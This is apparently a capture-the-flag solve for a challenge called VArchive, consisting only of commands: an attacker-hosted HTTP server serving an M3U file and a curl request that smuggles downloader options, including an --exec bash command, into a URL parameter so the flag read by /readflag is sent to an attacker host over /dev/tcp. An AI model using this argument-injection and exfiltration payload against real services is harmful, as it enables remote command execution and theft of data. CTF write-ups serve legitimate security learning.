# VArchive solve

```
root@attacker:$ cat > index.html <<EOF

#EXTM3U
#EXTINF:1,
EOF

root@attacker$ python3 -m http.server 8000
```


```
$ curl $'http://localhost:8000/?url=https://www.youtube.com/watch?v=ZZ5LpwO-An4"+"http://attacker:8000"+--exec+"bash+-c+\'echo+`/readflag`>/dev/tcp/attacker/8001\'+%23"+--verbose+--ignore-errors+--default-search%20'
```

